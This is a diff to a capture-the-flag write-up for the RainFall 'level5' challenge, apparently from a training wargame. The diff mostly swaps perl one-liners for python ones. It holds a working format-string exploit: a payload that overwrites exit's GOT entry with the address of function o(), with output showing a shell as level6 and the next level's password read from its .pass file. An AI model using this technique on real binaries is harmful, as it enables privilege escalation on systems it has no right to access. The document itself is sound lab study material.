@@ -1,6 +1,9 @@
-### Analysis
+# Level5
+
+## Analysis
 
 **In `main` :**
+
 - call to function `n()`
 
 **In `n()` :**
@@ -42,11 +45,11 @@ All defined functions:
 
 ___
 
-### Exploit
+## Exploit
 
 If we try to store a buffer `ABCD`, its done on the fourth position
 ```
-level5@RainFall:~$ perl -e 'print "ABCD" . " %4\$x" . "\n"' | ./level5
+level5@RainFall:~$ python -c 'print "ABCD" + " %4$x"' | ./level5
 ABCD 44434241
 ```
 
@@ -56,10 +59,14 @@ We'll change the adress ont he GOT (Global Offset Table) to point to `o()` adres
 > 0x8049838 [exit] -> 0x080484a4 [o()]
 
 ```
-level5@RainFall:~$ perl -e 'print "\x38\x98\x04\x08" . "%134513824d" . "%4\$n" . "\n"' > /tmp/level5 && cat /tmp/level5 - | ./level5
+level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/level5 && cat /tmp/level5 - | ./level5
 ...
 whoami
 level6
 cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
+
+___
+
+*Password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a*
